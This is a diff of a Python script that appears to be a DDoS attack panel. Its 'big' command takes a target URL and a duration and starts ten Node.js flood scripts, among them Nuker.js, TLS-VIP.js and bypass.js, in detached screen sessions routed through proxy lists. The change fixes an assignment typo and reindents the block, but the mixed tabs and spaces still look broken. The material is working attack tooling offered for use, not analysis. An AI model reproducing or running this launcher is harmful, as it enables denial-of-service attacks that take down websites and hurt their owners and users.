@@ -196,23 +196,23 @@ while True:
 				print(f'URL + TIME')
 				
 		elif sinput == "big":		
-			try:
-			    url	sin.split()[1]
-			    time = sin.split()[2]
-			    attack_banner()
-			    os.system(f'screen -dm node Nuker.js {url} {time} 30 proxy.txt 512')
-                os.system(f'screen -dm node BOT.js {url} {time} 512 30 proxy.txt')
-                os.system(f'screen -dm node 404.js {url} {time} 512 30 proxy.txt')
-                os.system(f'screen -dm node spank.js {url} {time} 30 proxy.txt')
-                os.system(f'screen -dm node YOLO.js {url} {time} 512 30 proxy.txt')
-                os.system(f'screen -dm node NOX.js {url} {time} 512 30 proxy.txt')                
-                os.system(f'screen -dm node tls-nig.js {url} {time} 512 30 proxy.txt')                
-                os.system(f'screen -dm node TLS.js {url} {time} 512 30')                
-                os.system(f'screen -dm node TLS-VIP.js {url} {time} 512 30 proxy.txt')                
-                os.system(f'screen -dm node bypass.js {url} {time} 512 30 proxy.txt')
-            except ValueError:
-                print(f'URL + TIME')
-            except IndexError:
-                print(f'URL + TIME')
+		        try:
+			        url = sin.split()[1]
+			        time = sin.split()[2]
+			        attack_banner()
+			        os.system(f'screen -dm node Nuker.js {url} {time} 30 proxy.txt 512')
+                                os.system(f'screen -dm node BOT.js {url} {time} 512 30 proxy.txt')
+                                os.system(f'screen -dm node 404.js {url} {time} 512 30 proxy.txt')
+                                os.system(f'screen -dm node spank.js {url} {time} 30 proxy.txt')
+                                os.system(f'screen -dm node YOLO.js {url} {time} 512 30 proxy.txt')
+                                os.system(f'screen -dm node NOX.js {url} {time} 512 30 proxy.txt')                
+                                os.system(f'screen -dm node tls-nig.js {url} {time} 512 30 proxy.txt')                
+                                os.system(f'screen -dm node TLS.js {url} {time} 512 30')                
+                                os.system(f'screen -dm node TLS-VIP.js {url} {time} 512 30 proxy.txt')                
+                                os.system(f'screen -dm node bypass.js {url} {time} 512 30 proxy.txt')
+                        except ValueError:
+                                print(f'URL + TIME')
+                        except IndexError:
+                                print(f'URL + TIME')
 
 	
